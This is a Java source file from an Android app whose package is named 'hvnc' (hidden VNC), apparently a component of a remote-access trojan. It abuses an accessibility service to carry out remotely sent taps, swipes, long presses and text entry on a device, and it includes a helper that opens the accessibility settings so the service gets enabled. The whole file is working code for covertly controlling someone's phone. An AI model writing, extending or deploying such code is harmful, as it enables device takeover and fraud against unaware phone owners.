package com.fason.app.features.hvnc;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.GestureDescription;
import android.content.Context;
import android.content.Intent;
import android.graphics.Path;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityNodeInfo;
import com.fason.app.core.FasonAccessibilityService;
import com.fason.app.core.FasonApp;
import org.json.JSONObject;

public final class InputInjector {
    private static final String TAG = "InputInjector";
    private static final long MIN_STROKE_MS = 50;
    private static final long MAX_STROKE_MS = 60_000;

    private InputInjector() {}
    public static boolean isReady() {
        return FasonAccessibilityService.getInstance() != null;
    }

    public static boolean isEnabled() {
        try {
            Context ctx = FasonApp.getContext();
            String enabled = Settings.Secure.getString(
                ctx.getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            if (enabled == null) return false;
            String serviceName = ctx.getPackageName() + "/com.fason.app.core.FasonAccessibilityService";
            for (String token : enabled.split(":")) {
                if (token.equals(serviceName)) return true;
            }
            return false;
        } catch (Exception e) {
            return false;
        }
    }

    public static void openSettings() {
        try {
            Context ctx = FasonApp.getContext();
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } catch (Exception ignored) {}
    }

    public static void handleInput(JSONObject data) {
        if (!isReady()) {
            Log.w(TAG, "Service not ready, input ignored");
            HVncManager.getInstance().onInputAck(false);
            return;
        }
        try {
            HVncManager mgr = HVncManager.getInstance();
            float scaleX = mgr.getInputScaleX();
            float scaleY = mgr.getInputScaleY();
            String inputType = data.optString("inputType", "");
            switch (inputType) {
                case "tap":
                    doTap(
                        (int)(data.optInt("x", 0) * scaleX),
                        (int)(data.optInt("y", 0) * scaleY)
                    );
                    break;
                case "swipe":
                    doSwipe(
                        (int)(data.optInt("x", 0) * scaleX),
                        (int)(data.optInt("y", 0) * scaleY),
                        (int)(data.optInt("dx", 0) * scaleX),
                        (int)(data.optInt("dy", 0) * scaleY),
                        data.optLong("duration", 300)
                    );
                    break;
                case "longpress":
                    doLongPress(
                        (int)(data.optInt("x", 0) * scaleX),
                        (int)(data.optInt("y", 0) * scaleY),
                        data.optLong("duration", 1000)
                    );
                    break;
                case "text":
                    doText(data.optString("text", ""));
                    break;
                default:
                    Log.w(TAG, "Unknown input type: " + inputType);
                    HVncManager.getInstance().onInputAck(false);
            }
        } catch (Exception e) {
            Log.e(TAG, "Input failed", e);
            HVncManager.getInstance().onInputAck(false);
        }
    }

    private static void doTap(int x, int y) {
        com.fason.app.core.FasonAccessibilityService svc = com.fason.app.core.FasonAccessibilityService.getInstance();
        if (svc == null) { HVncManager.getInstance().onInputAck(false); return; }
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, MIN_STROKE_MS);
        GestureDescription gesture = new GestureDescription.Builder().addStroke(stroke).build();
        svc.dispatchGesture(gesture, new GestureResultCallbackImpl(), null);
    }

    private static void doSwipe(int x, int y, int dx, int dy, long duration) {
        com.fason.app.core.FasonAccessibilityService svc = com.fason.app.core.FasonAccessibilityService.getInstance();
        if (svc == null) { HVncManager.getInstance().onInputAck(false); return; }
        long dur = clampDuration(duration);
        Path path = new Path();
        path.moveTo(x, y);
        path.lineTo(x + dx, y + dy);
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, dur);
        GestureDescription gesture = new GestureDescription.Builder().addStroke(stroke).build();
        svc.dispatchGesture(gesture, new GestureResultCallbackImpl(), null);
    }

    private static void doLongPress(int x, int y, long duration) {
        com.fason.app.core.FasonAccessibilityService svc = com.fason.app.core.FasonAccessibilityService.getInstance();
        if (svc == null) { HVncManager.getInstance().onInputAck(false); return; }
        long dur = clampDuration(duration);
        Path path = new Path();
        path.moveTo(x, y);
        GestureDescription.StrokeDescription stroke = new GestureDescription.StrokeDescription(path, 0, dur);
        GestureDescription gesture = new GestureDescription.Builder().addStroke(stroke).build();
        svc.dispatchGesture(gesture, new GestureResultCallbackImpl(), null);
    }

    private static void doText(String text) {
        com.fason.app.core.FasonAccessibilityService svc = com.fason.app.core.FasonAccessibilityService.getInstance();
        if (svc == null) { HVncManager.getInstance().onInputAck(false); return; }
        AccessibilityNodeInfo root = svc.getRootInActiveWindow();
        if (root == null) {
            Log.w(TAG, "No active window");
            HVncManager.getInstance().onInputAck(false);
            return;
        }
        AccessibilityNodeInfo target = findFocusedEditable(root);
        if (target == null) {
            target = findEditableNode(root);
        }
        if (target == null) {
            Log.w(TAG, "No editable node");
            root.recycle();
            HVncManager.getInstance().onInputAck(false);
            return;
        }
        Bundle args = new Bundle();
        args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
        boolean ok = target.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
        if (!ok) {
            Log.w(TAG, "SET_TEXT failed, trying paste");
            try {
                android.content.ClipboardManager cm = (android.content.ClipboardManager)
                    FasonApp.getContext().getSystemService(Context.CLIPBOARD_SERVICE);
                android.content.ClipData oldClip = cm.getPrimaryClip();
                android.content.ClipData clip = android.content.ClipData.newPlainText("text", text);
                cm.setPrimaryClip(clip);
                ok = target.performAction(AccessibilityNodeInfo.ACTION_PASTE);
                if (oldClip != null) {
                    cm.setPrimaryClip(oldClip);
                }
            } catch (Exception e) {
                Log.e(TAG, "Paste failed", e);
            }
        }
        target.recycle();
        if (target != root) {
            root.recycle();
        }
        HVncManager.getInstance().onInputAck(ok);
    }

    private static AccessibilityNodeInfo findFocusedEditable(AccessibilityNodeInfo root) {
        if (root == null) return null;
        if (root.isEditable() && root.isFocused()) return root;
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo found = findFocusedEditable(child);
                if (found != null) {
                    if (found != child) child.recycle();
                    return found;
                }
                child.recycle();
            }
        }
        return null;
    }

    private static AccessibilityNodeInfo findEditableNode(AccessibilityNodeInfo root) {
        if (root == null) return null;
        if (root.isEditable()) return root;
        for (int i = 0; i < root.getChildCount(); i++) {
            AccessibilityNodeInfo child = root.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo found = findEditableNode(child);
                if (found != null) {
                    if (found != child) child.recycle();
                    return found;
                }
                child.recycle();
            }
        }
        return null;
    }

    private static long clampDuration(long duration) {
        if (duration < MIN_STROKE_MS) return MIN_STROKE_MS;
        if (duration > MAX_STROKE_MS) return MAX_STROKE_MS;
        return duration;
    }

    private static final class GestureResultCallbackImpl extends AccessibilityService.GestureResultCallback {
        @Override
        public void onCompleted(GestureDescription gesture) {
            HVncManager.getInstance().onInputAck(true);
        }
        @Override
        public void onCancelled(GestureDescription gesture) {
            Log.w(TAG, "Gesture cancelled");
            HVncManager.getInstance().onInputAck(false);
        }
    }
}
